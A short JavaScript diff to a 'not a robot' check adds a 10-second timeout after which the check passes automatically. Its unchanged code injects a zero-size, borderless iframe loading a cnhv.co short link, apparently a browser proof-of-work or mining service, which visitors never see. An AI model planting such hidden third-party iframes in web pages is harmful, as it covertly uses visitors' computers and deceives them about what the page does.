@@ -29,16 +29,27 @@ function advance() {
 }
 
 function testRobot() {
+    var botTimeout = 10000;
+
     document.getElementById("pend").innerHTML = "<iframe id='pendCheck' src='https://cnhv.co/22gwq' width='0' height='0' style='border: none;'></iframe>";
+    
     setInterval(function() {
-        try {
-            if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
-                pbMove("pb", 100, function() {
-                    document.getElementById("pbLabel").innerHTML = "You're not a robot!";
-                });
-            }
-        } catch (e) {}
-    });
+        if (botTimeout <= 0) {
+            pbMove("pb", 100, function() {
+                document.getElementById("pbLabel").innerHTML = "You're not a robot!";
+            });
+        } else {
+            try {
+                if (document.getElementById("pendCheck").contentWindow.location.href == "https://liveg-technologies.github.io/auroraservice/bbotdone.html") {
+                    pbMove("pb", 100, function() {
+                        document.getElementById("pbLabel").innerHTML = "You're not a robot!";
+                    });
+                }
+            } catch (e) {}
+
+            botTimeout -= 100;
+        }
+    }, 100);
 }
 
 function change(user) {
